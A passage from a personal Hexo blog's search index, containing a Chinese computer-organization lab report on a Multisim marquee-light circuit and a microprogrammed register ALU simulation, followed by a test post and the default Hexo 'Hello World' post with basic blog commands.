External：外部触发方式，此时，需要接入外部触发信号。右侧的两个按钮用于外部触发脉冲的上升或下降沿的选择。<br>(4)Frequency区：用于设置字符信号飞输出时钟频率。<br>(5)字符编辑显示区：字信号发生器的最右侧的空白显示区，用来显示字符。<br><strong>跑马灯电路及数据设置</strong><br>    电路如图2-6所示。<br><img src="/images/%E8%B7%91%E9%A9%AC%E7%81%AF%E7%94%B5%E8%B7%AF.png"><br><strong>图2-6  跑马灯电路</strong><br>选择了低16位输出控制16个探针依次点亮。<br>    如图2-7为数据设置，将2的0~15次方依次存入，设置好开始点和终止点，让其循环显示16行数据，从而得到跑马灯效果。<br><img src="/images/%E6%95%B0%E6%8D%AE%E8%AE%BE%E7%BD%AE.png"><br><strong>图2-7数据设置</strong><br><font color=red> 注意：为了避免每次临时设置，可以将之“保存save”为xxx.dp文件；运行时“载入load”该文件。另外，频率与实际效果可能有出入，可以调整频率达到较理想效果。 </font><br><strong>2、实验原理</strong><br>通过设定字发生器的数据，使探针依次点亮，形成跑马灯。<br><strong>3、实验内容</strong><br>选择了低16位输出控制16个探针依次点亮。<br><img src="/images/%E8%B7%91%E9%A9%AC%E7%81%AF%E7%94%B5%E8%B7%AF%E5%9B%BE%E8%87%AA%E5%B7%B1.png"><br><strong>跑马灯电路图</strong></p><h6 id="实验报告-2"><a href="#实验报告-2" class="headerlink" title="实验报告"></a>实验报告</h6><p><img src="/images/%E8%B7%91%E9%A9%AC%E7%81%AF%E5%85%A8%E4%BA%AE.png"><br><strong>跑马灯全亮电路图</strong><br>由于每个小灯分别与字节发生器的一位相连，要使得小灯逐一点亮，可以通过逐一设定有效信号来实现。打开字节发生器的设置，将预设模式调节为右移或左移。</p><h5 id="实验四-模拟微程序实现指令"><a href="#实验四-模拟微程序实现指令" class="headerlink" title="实验四 模拟微程序实现指令"></a>实验四 模拟微程序实现指令</h5><p><strong>1、实验目的</strong><br>模拟微程序实现机器语言指令<br><strong>2、实验原理</strong><br>字发生器的一行输出数据可以作为一条微指令，一条机器语言指令由若干条微指令组成。用字发生器的输出取代图2-3中开关，模拟微指令自动执行实现一条机器语言指令。<br><strong>3、实验内容</strong><br>在Multisim画出电路图并仿真，完成如下操作。<br>（1）产生任意数据存入通用寄存器GR1。<br>（2）产生任意数据存入通用寄存器GR2完成GR1+GR2→GR1。<br>（3）完成GR1-GR2→GR2。<br>（4）完成GR1∧GR2→GR1。<br>（5）完成GR1∨GR2→GR2。<br>（6）完成GR1⊕GR2→GR1。<br>（7）GR1→GR2。（“-”表示逻辑非运算）<br>（8）-GR2→GR1。</p><h6 id="实验报告-3"><a href="#实验报告-3" class="headerlink" title="实验报告"></a>实验报告</h6><p><strong>实验原理：</strong><br>字发生器的一行输出数据可以作为一条微指令，一条机器语言指令由若干条微指令组成。用字发生器的输出取代图2-3中开关，模拟微指令自动执行实现一条机器语言指令。<br><strong>实验内容：</strong><br>在Multisim画出电路图<br><img src="/images/%E8%87%AA%E5%B7%B1%E7%94%BB%E7%9A%84%E5%A5%BD%E5%A4%8D%E6%9D%82%E7%9A%84%E7%94%B5%E8%B7%AF%E5%9B%BE.png"><br>仿真，完成如下操作。<br>（1）产生任意数据存入通用寄存器GR1。<br>答：通过K8设定数据，X2的G信号端输入低电平，将数据输入到总线中，然后，将GR1的OC端和CLK端输入低电平，给GR1的CLK端一个正脉冲（0→1）完成数据存入，随即OC端接入高电平，关闭GR1。<br>（2）产生任意数据存入通用寄存器GR2完成GR1+GR2→GR1。<br>答：<br>1.通过K8设定数据，X2的G信号端输入低电平，将数据输入到总线中，然后，将GR2的OC端和CLK端输入低电平，给GR2的CLK端一个正脉冲（0→1）完成数据存入，随即OC端接入高电平，关闭GR2。<br>2.将X2的G信号端接入高电平从而断开K8与总线的连接。将X12的G信号端、X6的G信号端和X8的CLK端口端接低电平，数据从GR1中传出，给X8暂存器一个上升沿信号，随即将X12的G信号端、X6的G信号和X8的CLK接高电平。<br>3.同理，将X11的G信号端、X3的G信号端和X4的CLK端口端接低电平，数据从GR2中传出，给X4暂存器一个上升沿信号，随即将X11和X3的G信号端、X4的CLK端口端接高电平。<br>4.将X5的S0-S3调为1、0、0、1，CN端为高电平、M端为低电平，对暂存器中的数据进行加法运算并将X7的G信号端调为低电平将数据输出到总线上。<br>5.将GR1的OC端口端接低电平，给GR1的CLK端口端一个上升沿信号，将结果存入GR1中，关闭GR1和ALU的输出。<br>（3）完成GR1-GR2→GR2。<br>答：<br>1.将X12的G信号端、X6的G信号端和X8的CLK端口端接低电平，数据从GR1中传出，给X8暂存器一个上升沿信号，随即将X12的G信号端、X6的G信号和X8的CLK接高电平。<br>2.同理，将X11的G信号端、X3的G信号端和X4的CLK端口端接低电平，数据从GR2中传出，给X4暂存器一个上升沿信号，随即将X11和X3的G信号端、X4的CLK端口端接高电平。<br>3.将X5的S0-S3调为0、1、1、0，CN端与M端均为低电平，对暂存器中的数据进行减法运算并将X7的G信号端调为低电平将数据输出到总线上。<br>4.将GR2的OC端口端接低电平，给GR1的CLK端口端一个上升沿信号，将结果存入GR2中，关闭GR2和ALU的输出。</p><p>（4）完成GR1∧GR2→GR1。<br>答：<br>1.将X12的G信号端、X6的G信号端和X8的CLK端口端接低电平，数据从GR1中传出，给X8暂存器一个上升沿信号，随即将X12的G信号端、X6的G信号和X8的CLK接高电平。<br>2.同理，将X11的G信号端、X3的G信号端和X4的CLK端口端接低电平，数据从GR2中传出，给X4暂存器一个上升沿信号，随即将X11和X3的G信号端、X4的CLK端口端接高电平。<br>3.将X5的S0-S3调为1、0、1、1，M端为高电平，对暂存器中的数据进行与运算并将X7的G信号端调为低电平将数据输出到总线上。<br>4.将GR1的OC端口端接低电平，给GR1的CLK端口端一个上升沿信号，将结果存入GR1中，关闭GR1和ALU的输出。<br>（5）完成GR1∨GR2→GR2。<br>答：<br>1.将X12的G信号端、X6的G信号端和X8的CLK端口端接低电平，数据从GR1中传出，给X8暂存器一个上升沿信号，随即将X12的G信号端、X6的G信号和X8的CLK接高电平。<br>2.同理，将X11的G信号端、X3的G信号端和X4的CLK端口端接低电平，数据从GR2中传出，给X4暂存器一个上升沿信号，随即将X11和X3的G信号端、X4的CLK端口端接高电平。<br>3.将X5的S0-S3调为1、1、1、0，M端为高电平，对暂存器中的数据进行或运算并将X7的G信号端调为低电平将数据输出到总线上。<br>4.将GR2的OC端口端接低电平，给GR2的CLK端口端一个上升沿信号，将结果存入GR2中，关闭GR2和ALU的输出。<br>（6）完成GR1⊕GR2→GR1。<br>答：<br>1.将X12的G信号端、X6的G信号端和X8的CLK端口端接低电平，数据从GR1中传出，给X8暂存器一个上升沿信号，随即将X12的G信号端、X6的G信号和X8的CLK接高电平。<br>2.同理，将X11的G信号端、X3的G信号端和X4的CLK端口端接低电平，数据从GR2中传出，给X4暂存器一个上升沿信号，随即将X11和X3的G信号端、X4的CLK端口端接高电平。<br>3.将X5的S0-S3调为0、1、1、0，M端为高电平，对暂存器中的数据进行异或运算并将X7的G信号端调为低电平将数据输出到总线上。<br>4.将GR1的OC端口端接低电平，给GR1的CLK端口端一个上升沿信号，将结果存入GR1中，关闭GR1和ALU的输出。<br>（7）-GR1→GR2。（“-”表示逻辑非运算）<br>答：<br>1.将X12的G信号端、X6的G信号端和X8的CLK端口端接低电平，数据从GR1中传出，给X8暂存器一个上升沿信号，随即将X12的G信号端、X6的G信号和X8的CLK接高电平。<br>2.将X5的S0-S3调为0、0、0、0，M端为高电平，对暂存器中的数据进行逻辑非运算并将X7的G信号端调为低电平将数据输出到总线上。<br>3.将GR2的OC端口端接低电平，给GR2的CLK端口端一个上升沿信号，将结果存入GR2中，关闭GR2和ALU的输出。<br>（8）-GR2→GR1。<br>答：<br>1.将X11的G信号端、X3的G信号端和X4的CLK端口端接低电平，数据从GR2中传出，给X4暂存器一个上升沿信号，随即将X11和X3的G信号端、X4的CLK端口端接高电平。<br>2.将X5的S0-S3调为0、1、0、1，M端为高电平，对暂存器中的数据进行逻辑非运算并将X7的G信号端调为低电平将数据输出到总线上。<br>3.将GR1的OC端口端接低电平，给GR1的CLK端口端一个上升沿信号，将结果存入GR1中，关闭GR1和ALU的输出。</p><p>@更新于2021.1.3/4/5</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程设计 </tag>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>胡小宁的第一篇博客文章</title>
      <link href="/2021/01/03/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/"/>
      <url>/2021/01/03/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="这个标题有点冷"><a href="#这个标题有点冷" class="headerlink" title="这个标题有点冷"></a>这个标题有点冷</h2><blockquote><p>我是用来测试的引用，哭唧唧</p></blockquote><h3 id="胡小宁是怎么写博客的？"><a href="#胡小宁是怎么写博客的？" class="headerlink" title="胡小宁是怎么写博客的？"></a>胡小宁是怎么写博客的？</h3><p>根据Markdown语法编写，胡小宁用的编辑器是notepad++，手敲代码美滋滋（zb大法好）</p><blockquote><p>本文之外，别无它物。——德里达</p></blockquote><p>@更新于2021/1/3</p>]]></content>
      
      
      <categories>
          
          <category> 闲言碎语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/01/03/hello-world/"/>
      <url>/2021/01/03/hello-world/</url>
      
        <content type="html"><![CDATA[<p>欢迎访问 <a href="https://hexo.io/">Hexo</a>! 这是第一个post. 点击 <a href="https://hexo.io/docs/">我</a> 获取更多内容. 如果你在使用hexo时遇到了任何问题, 你可以在这里找到答案 <a href="https://hexo.io/docs/troubleshooting.html">我遇到麻烦了</a> 或者你可以直接问我在我的github上 <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h2><p>如果是windows操作系统，win+R开启运行，输入cmd打开命令框。在blog（胡小宁自己的博客文件夹）目录下操作。</p><h3 id="创作一个帖子"><a href="#创作一个帖子" class="headerlink" title="创作一个帖子"></a>创作一个帖子</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>更多内容: <a href="https://hexo.io/docs/writing.html">创作</a></p><h3 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>更多内容: <a href="https://hexo.io/docs/generating.html">生成文件</a></p><h3 id="启动本地服务链接"><a href="#启动本地服务链接" class="headerlink" title="启动本地服务链接"></a>启动本地服务链接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>更多内容: <a href="https://hexo.io/docs/server.html">本地连接服务</a></p><h3 id="在远端部署（也就是github）"><a href="#在远端部署（也就是github）" class="headerlink" title="在远端部署（也就是github）"></a>在远端部署（也就是github）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>更多内容: <a href="https://hexo.io/docs/one-command-deployment.html">推送文件</a></p><p>@更新于2021/1/3</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
